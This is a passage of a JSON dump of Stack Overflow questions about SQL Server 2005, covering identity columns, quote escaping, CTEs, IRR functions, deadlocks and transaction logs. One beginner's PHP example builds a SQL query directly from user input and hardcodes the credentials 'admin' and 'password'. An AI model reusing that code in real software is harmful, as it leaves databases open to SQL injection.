default value.</p>\n\n<p>Regards,\nAbhishek jain</p>\n"},{"tags":["sql","sql-server-2005","identity-column"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":512,"score":0,"question_id":2847789,"title":"Identity column SQL Server 2005 inserting same value twice","body":"<p>I have a stored procedure that inserts into a table (where there is an identity column that is not the primary key- the PK is inserted initially using the date/time to generate a unique value).</p>\n\n<p>We then use SCOPEIDENTITY() to get the value inserted, then there is some logic to generate the primary key field value based on this value, which is then updated back to the table.</p>\n\n<p>In some situations the stored procedure is called simultaneously by more than one process, resulting in \"Violation of PRIMARY KEY constraint...\" errors.</p>\n\n<p>This would seem to indicate that the identity column is allowing the same number to be inserted for more than one record.</p>\n\n<p>First question- how is this possible?</p>\n\n<p>Second question- how to stop it...there's no error handling currently so I'm going to add some try/ catch logic- but would like to understand the problem fully to deal with properly</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":3191947,"title":"How to obtain only ALL Undocumented Stored Procs in SQL SERVER 2005","body":"<p>If I write </p>\n\n<pre><code>SELECT * FROM sys.all_objects\nWHERE ([type] = 'P');\n</code></pre>\n\n<p>I will get all the SQL Stored Procedure. But how to obtain only the Undocumented ones?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","performance","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12091019,"title":"WHERE in Sql, combining two fast conditions multiplies costs many times","body":"<p>I have a fairly complex sql that returns 2158 rows' id from a table with ~14M rows. I'm using CTEs for simplification. </p>\n\n<p>The <code>WHERE</code> consists of two conditions. If i comment out one of them, the other runs in ~2 second. If i leave them both (separated by <code>OR</code>) the query runs ~100 seconds. The first condition alone needs 1-2 seconds and returns 19 rows, the second condition alone needs 0 seconds and returns 2139 rows.</p>\n\n<p>What can be the reason?</p>\n\n<p>This is the complete SQL:</p>\n\n<pre><code>WITH fpcRepairs AS\n(\n    SELECT FPC_Row = ROW_NUMBER()OVER(PARTITION BY t.SSN_Number ORDER BY t.Received_Date, t.Claim_Creation_Date, t.Repair_Completion_Date, t.Claim_Submitted_Date)\n    ,   idData, Repair_Completion_Date, Received_Date, Work_Order, SSN_number, fiMaxActionCode, idModel,ModelName\n    ,   SP=(SELECT TOP 1 Reused_Indicator FROM tabDataDetail td INNER JOIN tabSparePart sp ON td.fiSparePart=sp.idSparePart\n            WHERE td.fiData=t.idData\n            AND (td.Material_Quantity &lt;&gt; 0) \n            AND (sp.SparePartName = '1254-3751'))\n    FROM   tabData AS t INNER JOIN\n       modModel AS m ON t.fiModel = m.idModel \n    WHERE (m.ModelName = 'LT26i') \n    AND EXISTS(\n        SELECT  NULL \n        FROM    tabDataDetail AS td \n        INNER JOIN tabSparePart AS sp ON td.fiSparePart = sp.idSparePart\n        WHERE  (td.fiData = t.idData) \n        AND (td.Material_Quantity &lt;&gt; 0) \n        AND (sp.SparePartName = '1254-3751')\n    ) \n), needToChange AS\n(\n    SELECT idData FROM tabData AS t INNER JOIN\n       modModel AS m ON t.fiModel = m.idModel\n    WHERE (m.ModelName = 'LT26i') \n    AND EXISTS(\n        SELECT  NULL \n        FROM    tabDataDetail AS td \n        INNER JOIN tabSparePart AS sp ON td.fiSparePart = sp.idSparePart\n        WHERE  (td.fiData = t.idData) \n        AND (td.Material_Quantity &lt;&gt; 0) \n        AND (sp.SparePartName IN ('1257-2741','1257-2742','1248-2338','1254-7035','1248-2345','1254-7042'))\n    ) \n)\nSELECT t.idData\nFROM tabData AS t INNER JOIN modModel AS m ON t.fiModel = m.idModel\nINNER JOIN needToChange ON t.idData = needToChange.idData  -- needs to change FpcAssy\nLEFT OUTER JOIN fpcRepairs rep ON t.idData = rep.idData\nWHERE   \nrep.idData IS NOT NULL          -- FpcAssy replaced, check if reused was claimed correctly\nAND rep.FPC_Row &gt; 1             -- other FpcAssy repair before\nAND (\n    SELECT SP FROM fpcRepairs lastRep\n    WHERE lastRep.SSN_Number = rep.SSN_Number\n    AND lastRep.FPC_Row = rep.FPC_Row - 1\n) = rep.SP                      -- same SP, must be rejected(reused+reused or new+new)\nOR      \nrep.idData IS NOT NULL          -- FpcAssy replaced, check if reused was claimed correctly\nAND rep.FPC_Row = 1             -- no other FpcAssy repair before\nAND rep.SP = 0                  -- not reused, must be rejected\norder by t.idData \n</code></pre>\n\n<p>Here's the execution plan:</p>\n\n<p>Download: <a href=\"http://www.filedropper.com/exeplanfpc\" rel=\"nofollow\">http://www.filedropper.com/exeplanfpc</a></p>\n"},{"tags":["regex","sql-server-2005","escaping","quoting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12091639,"title":"SQL lost in to escaping characters for INSERT statements","body":"<ul>\n<li>I am using Microsoft SQL <strong>2005</strong>. </li>\n<li>\"Someone\" gives me a list of <code>INSERT</code> \"pre-defined statements\" that I <strong>CANNOT modify outside SQL</strong> (e.g. using scripting languages like Python).</li>\n<li>Being the \"Someone\" I am having issues trying to <strong>escape quoting characters</strong> for fields of type <code>NVARCHAR</code>.</li>\n</ul>\n\n<p>Say for example I need to run the following SQL statement:</p>\n\n<pre><code>INSERT INTO TableX VALUES('John Doe's value') -- This is not working because of single quotes...\n</code></pre>\n\n<p>I need to find a way to transform that string to insert (<code>John Doe's value</code>) without using methods outside of SQL statements.</p>\n\n<p>I unsuccesfully tried something like the following statements, concatenating a single quote with a <code>REPLACE</code> function and another single quote:</p>\n\n<pre><code>INSERT INTO TableX VALUES('' + REPLACE('John Doe's value'), ''', '''' + '')\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>INSERT INTO TableX VALUES('''''' + REPLACE(''''''John Doe's value'''''''), '''''', '''''''' + '''''')\n</code></pre>\n\n<p>In order to deal with escaping characters, but it is not working.</p>\n\n<p>I would prefer using functions or simple stuff like that rather than using stored procedures or more complex solutions.</p>\n"},{"tags":["tsql","sql-server-2005","datetime-format"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":908,"score":0,"question_id":10300647,"title":"How to convert a DateTime string to a DateTime in SQL Server","body":"<p>I have a DateTime varchar in this format: 2005-08-08T00:00:00+01:00.</p>\n\n<ol>\n<li>Does this format have a name? (it's not ISO8601. Is it RFC3339?)</li>\n<li>How can I convert it to a DateTime using Transact-Sql?</li>\n</ol>\n\n<p><strong>EDIT</strong>\nHere's a summary answer, cobbled together from others input:</p>\n\n<ol>\n<li>It <em>is</em> ISO8601 with a time offset from UTC. If it was UTC it would end with a 'Z' instead of '+01:00'.  <a href=\"http://en.wikipedia.org/wiki/ISO_8601#Time_offsets_from_UTC\" rel=\"nofollow\">wikipedia</a></li>\n<li><p>You can convert it to local time or to utc as follows:</p>\n\n<blockquote>\n  <p>DECLARE @d VARCHAR(25) SET @d = '2007-08-08T00:01:00+01:00' SET @d =\n  '2007-08-08T00:01:00-01:00' SET @d = '2007-08-08T00:01:00+05:30'</p>\n  \n  <p>SELECT @d as Input, CONVERT(DATETIME, LEFT(@d, 19), 126) AS LocalDate\n  , DATEADD(MINUTE  , -CAST((SUBSTRING(@d, 20, 1) + RIGHT(@d, 2)) AS\n  INT)  , DATEADD(HOUR \n         ,-CAST(SUBSTRING(@d, 20, 3) AS INT)\n         , CONVERT(DATETIME, LEFT(@d, 19), 126))) as UtcDate WHERE @d LIKE '<strong>_<em>-</strong>-</em>_T__:<strong>:</strong>[+-]<strong>:</strong>'</p>\n</blockquote></li>\n</ol>\n\n<p>Results:</p>\n\n<pre><code>Input                     LocalDate               UtcDate\n------------------------- ----------------------- -----------------------\n2007-08-08T00:01:00+01:00 2007-08-08 00:01:00.000 2007-08-07 23:01:00.000\n\n2007-08-08T00:01:00-01:00 2007-08-08 00:01:00.000 2007-08-08 01:01:00.000\n\n2007-08-08T00:01:00+05:30 2007-08-08 00:01:00.000 2007-08-07 18:31:00.000\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":3386322,"title":"Assigning a value to a variable in SQL exec","body":"<p>It's possible to assign a value to a variable returned from <code>exec @sql</code>?:</p>\n\n<pre><code>set @var= exec calculate 'param' are this true\n</code></pre>\n"},{"tags":["php","html","sql-server-2005","tcpdf"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12070659,"title":"PHP: connecting to available remote db, retriving data from db and filling that data in an html form, and print form data as pdf","body":"<p>I have created an html form with over 20 fields and want to print data from the form a page or pdf for printout using php. </p>\n\n<p>But most of the field data is available in a sql server 2005 database already available to me. But I'm not able to access this database. And I need to access it. Once I access the database, I need to use data entered into my 'id' &amp; 'date' field to retrieve data from the db as that 'id' and 'date'.(Example Query: Select * from tablename where id=\"123\" and date=\"12/08/2012\" ;  or something like that) After that I need to push this data into their relevant fields in my html form. And once i click submit after all this is entered. I need it to display all this information as a table in the browser or as a pdf, so i can print it out. I read up on tcpdf but can't make head otr tail of it. Hope you can help.</p>\n\n<p>Can anyone help me with this? </p>\n\n<p>Keep in mind that I'm new to coding and php and databases. I have a little experience with html. But I'm not great with advanced stuff.</p>\n\n<p>I would love it if u could answer me with a sample program similar to mine with all the necessary elements. Thank You in advance! I hope I'm not asking for too much.</p>\n\n<pre><code>&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n    &lt;head&gt;\n        &lt;title&gt;TEST PHP DB&lt;/title&gt;\n        &lt;?php\n        if (!isset($_POST=\"\"))\n        {\n            $mydb=\"OASIS\";\n            $conn=mssql_connect(\"Server\", \"admin\", \"password\") or die (\"Error in Connection\");\n            $select=mssql_select_db($mydb,$conn) or die(\"Couldn't connect to db\");\n\n            $pid=$_POST(\"ID\");        \n            $strSQL = \"SELECT [First Name] FROM [Data Table] where Patient='$pid'\";\n            $rs = mssql_query($strSQL);\n\n            while($row = mssql_fetch_array($rs)) \n            {\n                echo $row[\"First Name\"];\n            }\n\n            if (!$strSQL) \n            {\n                die('MSSQL error: ' . mssql_get_last_message());\n            }\n\n            mssql_close($conn);\n        }\n        ?&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;form name=\"test\" method=\"POST\"&gt;\n            ID : &lt;input name=\"ID\" type=\"text\"&gt;\n            &lt;input type=\"submit\" value=\"Search\"&gt;\n            NAME : &lt;input name=\"FirstName\" type=\"text\"&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":7192,"score":3,"question_id":472550,"title":"How to change the Auto Growth size? MS SQL Server 2005","body":"<p>In MS Sql server 2005, by default 1MB Auto Growth is there, How can i change it to whatever i need.?</p>\n\n<p>Thanx,\nAmbanna</p>\n"},{"tags":["database","sql-server-2005","backup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1163,"score":1,"question_id":1179442,"title":"Verifying Full database backups \"WITH CHECKSUM\"","body":"<p>We have a daily maintenance plan in SQL Server 2005 that performs a full backup to disk using the \"Back Up Database Task\". </p>\n\n<p>\"Verify backup integrity\" is enabled but from what I understand data integrity is only validated if the backup media contains a checksum, which is enabled by the \"WITH CHECKSUM\" option during the backup. I can see from generated T-SQL that the maintenance plan task does not create this so, apart from manually hacking the command's code, how do we specify this in the task (if it is indeed possible)?</p>\n"},{"tags":["sql","sql-server-2005","common-table-expression","recursive-query"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":12081073,"title":"SQL Recursive CTE using two tables","body":"<p>I have two tables, one is a Product Customer mapping and another is a Product sharing table. Using SQL recursive CTE, given a product, I am trying to find all the products that are linked as a chain, mapped across the customers. In addition, if a Product is shared with another Product, I need to include it in the chain too. Hopefully, my example make more sense than the description</p>\n\n<pre><code>Product Customer Table\nProduct    Customer\n  Milk     Illinois\n  Milk     Michigan\n  Butter   Michigan\n  Cream    Wisconsin\n  Honey    Wisconsin\n  Cheese   Minnesota\n\nProduct Sharing Table\nProduct    SharedProduct\n Butter     Cream\n Cream      Cheese\n</code></pre>\n\n<p>For the above data, let's say my input Product is Milk, then the result set should include all the products - Milk, Butter, Cream, Honey &amp; Cheese. Here Butter-Cream &amp; Cream-Cheese are linked through the Product Sharing table.</p>\n\n<p>My current SQL looks like this but doesn't really work more than one level deep.</p>\n\n<pre><code>WITH Product_CTE AS\n(\n  SELECT DISTINCT [Product] FROM ProductCustomer\n  WHERE [Product] IN (SELECT DISTINCT p2.[Product]\n  FROM ProductCustomer p1 INNER JOIN ProductCustomer p2\n  ON p1.[Customer] = p2.[Customer] WHERE p1.[Product] = 'Milk')\n  UNION ALL\n  SELECT [SharedProduct] FROM ProductSharing b\n  INNER JOIN Product_CTE p ON p.[Product] = b.[Product]\n)\nSelect [Product] from Product_CTE\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12080074,"title":"Select on records based on two column criterias","body":"<p>I would like to do an SQL query to select from the following table:</p>\n\n<pre><code>id    type    num\n1     a       3\n1     b       4\n2     a       5\n2     c       6\n</code></pre>\n\n<p>In the case where they have the same 'id' and be type 'a or b', so the result would look something like this:</p>\n\n<pre><code>id    type    num\n1     a       3\n1     b       4\n</code></pre>\n\n<p>Any one has any idea how that can be accomplished?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":136,"score":1,"question_id":12074638,"title":"TSQL Internal Rate of Return (IRR) from row instead of columns","body":"<p>I have a data table like this:</p>\n\n<pre><code>Group   ID    M0    M1    ...    M20\n------------------------------------\n    1    1    10    -2    ...     54\n    1    2    -8    10    ...    -20\n    2    6   -10    12    ...      0\n    2    4    45    52    ...      0\n    2    5    12   102    ...      0\n</code></pre>\n\n<p>I'm grouping my data by Group like so:</p>\n\n<pre><code>SELECT Group\n     , round(sum(M0+M1+M2+...+M20)/count(ID),2) as profit\n     , round(sum(M0),2) as M0\n     , round(sum(M1),2) as M1\n     , ...\n     , round(sum(M20),2) as M20\nFROM\n    data_table\nGROUP BY\n    Group\n</code></pre>\n\n<p>What I need to add is IRR based on M0 to M20 columns.</p>\n\n<p>I found an IRR function that looks like this:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[ufn_IRR]\n  (\n   @strIDs VARCHAR(8000),\n   @guess DECIMAL(30,10)\n  )\nRETURNS DECIMAL(30, 10)\nAS \n  BEGIN\n    DECLARE @t_IDs TABLE (\n        id INT IDENTITY(0, 1),\n        value DECIMAL(30, 10)\n    )\n    DECLARE @strID VARCHAR(12),@sepPos INT,@NPV DECIMAL(30, 10)\n    SET @strIDs = COALESCE(@strIDs + ',', '')\n    SET @sepPos = CHARINDEX(',', @strIDs)\n    WHILE @sepPos &gt; 0 \n      BEGIN\n        SET @strID = LEFT(@strIDs, @sepPos - 1)\n        INSERT INTO @t_IDs ( value ) SELECT ( CAST(@strID AS DECIMAL(20, 10)) ) WHERE ISNUMERIC(@strID) = 1\n        SET @strIDs = RIGHT(@strIDs, DATALENGTH(@strIDs) - @sepPos)\n        SET @sepPos = CHARINDEX(',', @strIDs)\n      END\n\n    SET @guess = CASE WHEN ISNULL(@guess, 0) &lt;= 0 THEN 0.00001 ELSE @guess END\n\n    SELECT @NPV = SUM(value / POWER(1 + @guess, id)) FROM @t_IDs\n    WHILE @NPV &gt; 0 \n      BEGIN\n        SET @guess = @guess + 0.00001\n        SELECT @NPV = SUM(value / POWER(1 + @guess, id)) FROM @t_IDs\n      END\n    RETURN @guess\n  END\n</code></pre>\n\n<p>Sample usage looks like this:</p>\n\n<pre><code>SELECT  dbo.ufn_IRR('-4000,1200,1410,1875,1050',0.00001)\n</code></pre>\n\n<p>But in my case I would like to avoid creating string from my columns, as this:</p>\n\n<pre><code> SELECT  dbo.ufn_IRR(\n    cast(round(sum([M0]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M1]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M2]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M3]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M4]), 2) AS NVARCHAR)+','\n   +...+','\n   +cast(round(sum([M20]), 2) AS NVARCHAR)\n ,0.00001)\n</code></pre>\n\n<p>I think it is pointless to first create a string and then inside function cut it into table.<br />\nI would like to modify IRR function so than I can pass my columns, but I don't have Idea how I should do that :/</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12079137,"title":"Displaying multiple strings of data in the same cell (OnSameLine)","body":"<p>I have a data type called vectors. During the process I created the user has check boxes to select 1 or more vectors (up to 4). After selecting these I want the table to display those potential multiple values on the same line under vectors (i.e. 1,3,4). Here is my following code:</p>\n\n<pre><code>SELECT DISTINCT Requirement.RequirementId, CapabilityAreaName, RequirementNumber, RequestorOrg, RequestDate, RequestorSID, RequestorPhone, RequestorName, RequestEmail, RequestDescription, dbo.requirementVectorsOnSameLine(Requirement.RequirementId) as Vectors, title FROM Requirement\nINNER JOIN CapabilityArea\nON Requirement.CapabilityAreaId = CapabilityArea.CapabilityAreaId\nINNER JOIN dbo.RequirementVectors\nON Requirement.RequirementId = RequirementVectors.RequirementId\nWHERE Requirement.CapabilityAreaId = '57' AND WaitingFlag = '1'\n</code></pre>\n\n<p>The only thing I receive with this code is the column names of my tables. When I delete <code>INNER JOIN dbo.RequirementVectors</code> and <code>dbo.requirementVectorsOnSameLine(Requirement.RequirementId) as Vectors</code> I am lost on how I can get this to work. </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12077538,"title":"How to Sort datetime in ROW_NUMBER() OVER ( ORDER BY clause","body":"<p>Hi the below query is a prototype of a bigger complex query\nThe problem is that i should be able sort any column in any order (i.e. ASC and DESC) based on user input.</p>\n\n<pre><code>CREATE table #Table1(\nName varchar(10) PRIMARY key,\nDOB DateTime,\nRate numeric(10,2)  \n)\n\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name1','2/2/2012',10.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name2','3/2/2012',120.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name3','4/2/2012',110.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name4','5/2/2012',140.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name15','6/2/2012',130.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name6','2/21/2012',1120.23)\n\nDeclare @SortColumn varchar(10)\nDECLARE @SortExpression varchar (10)\n\nSET @SortColumn = 'DOB'\nSET @SortExpression = 'DESC' -- Need to sort in both ASC and DESC\n\nSelect \n            Name,\n            DOB,\n            Rate,\n            ROW_NUMBER() OVER \n                (ORDER BY \n                    CASE WHEN @SortColumn = 'Name' then Name\n                         WHEN @SortColumn = 'DOB' THEN DOB\n                         WHEN @SortColumn = 'Rate' THEN Rate\n                    END  +  @SortExpression \n                ) AS RowNumber  \n                FROM \n                #Table1\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1596,"score":0,"question_id":9014531,"title":"Read SQL Server transaction log","body":"<p>How we can read SQL Server transaction logs, I know using <code>dbcc</code> command but row data is in hex format how we can read it in text format or convert the hex data to text.i want to make a tool that can read logs.third party tools are available but they are paid tools.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":119,"score":2,"question_id":11995777,"title":"%% Vs CONTAINSTABLE","body":"<p>This is in continuation to my <strong><a href=\"http://stackoverflow.com/questions/11994281/near-matches-not-found-in-containstable\">Previous Query</a></strong></p>\n\n<h2>DDL</h2>\n\n<pre><code>CREATE TABLE [dbo].[t](\n    [words] [varchar](1000) NULL,\n    [id] [int] IDENTITY(1,1) NOT NULL\n) ON [PRIMARY]\n</code></pre>\n\n<h2>DML</h2>\n\n<pre><code>insert into t(words)values('this is my laptop')\ninsert into t(words)values('this does not contains heqadphone')\n</code></pre>\n\n<p>These two inserts are iterated 250 times...</p>\n\n<h2>SQL Queries - 1</h2>\n\n<pre><code>SELECT * FROM \nt as t\nJOIN CONTAINSTABLE(t, words,'\"*heqadphone\"') fulltextSearch\nON\nt.[Id] = fulltextSearch.[KEY]\n</code></pre>\n\n<h2>SQL Query - 2</h2>\n\n<pre><code>Select * from t where words like '%heqadphone%'\n</code></pre>\n\n<h2>Confusions</h2>\n\n<p>Normally we are advised to not use double %% as stated in my later query. But After checking the SQL Profiler Reads and Duration</p>\n\n<h2>Query 1 shows more reads/duration . Click the below link to see details</h2>\n\n<p><strong><a href=\"http://i.stack.imgur.com/kRVhe.jpg\" rel=\"nofollow\">SQL Profiler Reads and Duration for Query - 1</a></strong></p>\n\n<h2>Query 2 shows less reads/duration . Click the below link to see details</h2>\n\n<p><strong><a href=\"http://i.stack.imgur.com/72fNC.jpg\" rel=\"nofollow\">SQL Profiler Reads and Duration for Query - 2</a></strong></p>\n\n<p>Can you confirm, Ideally which query can be good to use?</p>\n"},{"tags":["sql-server-2005","hibernate","c3p0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":927,"score":0,"question_id":1700008,"title":"SQL Server 2005 - Cannot rollback nested transaction","body":"<p>Sometimes I get the following from SQL Server 2005 when executing a stored procedure:</p>\n\n<pre>\nCaused by: com.microsoft.sqlserver.jdbc.SQLServerException: Cannot roll back T1. No transaction or savepoint of that name was found.\n    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.doExecutePreparedStatement(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$PrepStmtExecCmd.doExecute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.executeUpdate(Unknown Source)\n    at com.mchange.v2.c3p0.impl.NewProxyCallableStatement.executeUpdate(NewProxyCallableStatement.java:2160)\n    at com.sm.persistence.dao.TransactionRejectDAO.callSpMoveTransaction(TransactionRejectDAO.java:631)\n    ... 6 more\n</pre>\n\n<p>Any ideas?</p>\n\n<p>When the connection pooling mechanism attempts to close the prepared statement:</p>\n\n<pre>\nNov 9, 2009 9:32:55 AM com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement close\nWARNING: SQLServerPreparedStatementID:201 ( ConnectionID:139 TransactionID:0x1A00000039000000): Error (ignored) closing PreparedHandle:0\ncom.microsoft.sqlserver.jdbc.SQLServerException: The server failed to resume the transaction. Desc:390000001a.\n    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSParser.parse(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSParser.parse(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$1PreparedHandleClose.doExecute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.closePreparedHandle(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.close(Unknown Source)\n    at com.mchange.v1.db.sql.StatementUtils.attemptClose(StatementUtils.java:41)\n    at com.mchange.v2.c3p0.stmt.GooGooStatementCache.synchronousDestroyStatement(GooGooStatementCache.java:413)\n    at com.mchange.v2.c3p0.stmt.GooGooStatementCache.closeAll(GooGooStatementCache.java:351)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.closeAllCachedStatements(NewPooledConnection.java:673)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:543)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:234)\n    at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.destroyResource(C3P0PooledConnectionPool.java:470)\n    at com.mchange.v2.resourcepool.BasicResourcePool$1DestroyResourceTask.run(BasicResourcePool.java:964)\n    at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:547)\nNov 9, 2009 9:32:55 AM com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement close\nWARNING: SQLServerPreparedStatementID:186 ( ConnectionID:139 TransactionID:0x1A00000039000000): Error (ignored) closing PreparedHandle:0\n</pre>\n\n<p>The stored procedure contains a nested transaction T1 which I believe is unnecessary. Could that be the problem?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":11912740,"title":"Group columns into multiple rows and Group_concate like MySQL in SQL Server","body":"<p>I’ve been looking for a way to show one column in multiple rows, one cell. The content of it separated by comma’s.</p>\n\n<p>For example, in stead of:</p>\n\n<pre>\nProjectID  Name                 count\n-------------------------------------\n   2       Technical Services    31\n   1       Security Services     32\n   7       Technical Services    32\n</pre>\n\n<p>I would like the result of my query to look like this:</p>\n\n<pre>\nName                 Label\n---------------------------\nTechnical Services   31,2\nTechnical Services   32,7\nSecurity Services    32,1 \n</pre>\n\n<p>I also want the result of my query to look like this: (like <code>Group_Concate</code> in MySQL)</p>\n\n<pre>\nName                 Label\n-------------------------------\nSecurity Services    32,1 \nTechnical Services   31,2: 32,7\n</pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":45,"score":4,"question_id":12051111,"title":"Select 2 columns from 3 tables","body":"<p>I have 3 tables:</p>\n\n<pre><code>Table t1:     Table t2:     Table t3:     \n+----+----+   +----+----+   +----+----+   \n| i1 | i2 |   | i2 | c2 |   | i1 | c1 |   \n+----+----+   +----+----+   +----+----+   \n|  1 | 22 |   |  11| cc |   |  1 | e  |   \n|  2 | 33 |   |  22| bb |   |  2 | f  |   \n|  3 | 11 |   |  33| aa |   |  3 | g  |   \n+----+----+   +----+----+   +----+----+   \n</code></pre>\n\n<p>and I want to select the colum c2 from t2 and c1 from t3 using the table t1 with the columns i1 and i2 and the result would be thins:</p>\n\n<pre><code>requested Tabel:     \n+----+----+   \n| c1 | c2 |   \n+----+----+   \n|  e | bb |   \n|  f | aa |   \n|  g | cc |   \n+----+----+   \n</code></pre>\n\n<p>I did a select with a union like this:</p>\n\n<pre><code>select pve.c1\nfrom dbo.t3 as pve\njoin dbo.t1 as v\non pve.i1 = v.i1\nunion\nselect vse.c2\nfrom dbo.t2 as vse\njoin dbo.t1 as e\non vse.i2 = e.i2\n</code></pre>\n\n<p>and the result is this:</p>\n\n<pre><code>resulted Tabel:     \n+----+\n| i1 |\n+----+\n|  e |\n|  f |\n|  g |\n|  bb|\n|  aa|\n|  cc|\n+----+\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","jdbc","spring-jdbc","database-deadlocks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":11990797,"title":"Best way to tackle deadlocks","body":"<p>Its simple question , but I wasted few days with having any clear solution over it.</p>\n\n<p>I am using spring jdbc templates as my DAO layer mssql sever 2005 as my database and we have a order entry system. Now we are getting so many dead lock scenarios when we have more than 5 people on the system. it seems lock happens when people try to create new order while others updating existing orders. It seems a conflict between insert and update statement for same table.</p>\n\n<p>I did few thing to fix this and didn't work any of them. So now I am thinking to introduce java.util.semaphore or a Lock and control the concurrent access of threads, or just I can go for Synchronized methods or blocks. </p>\n\n<p>What do you guys think about this? Is there any better way of handling this on data base server?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","entity-framework","sql-server-2008","datetime","datetime2"],"answer_count":6,"favorite_count":19,"up_vote_count":75,"down_vote_count":0,"view_count":15554,"score":75,"question_id":316422,"title":"Using SQL Server 2008 and SQL Server 2005 and date time","body":"<p>I've built a entity framework model against a 2008 database.  All works ok against the 2008 database.  When I try to update the entity on a 2005 database I get this error.  </p>\n\n<pre>The version of SQL Server in use does not support datatype 'datetime2</pre>\n\n<p>I specifically did not use any 2008 features when I built the database.  I can't find any reference to datetime2 in the code.  And, yes the column is defined as \"datetime\" in the database.  </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":78,"score":-1,"question_id":12056716,"title":"How to insert multiple rows with one statement","body":"<pre><code>CREATE DATABASE Exercise\n\nUSE 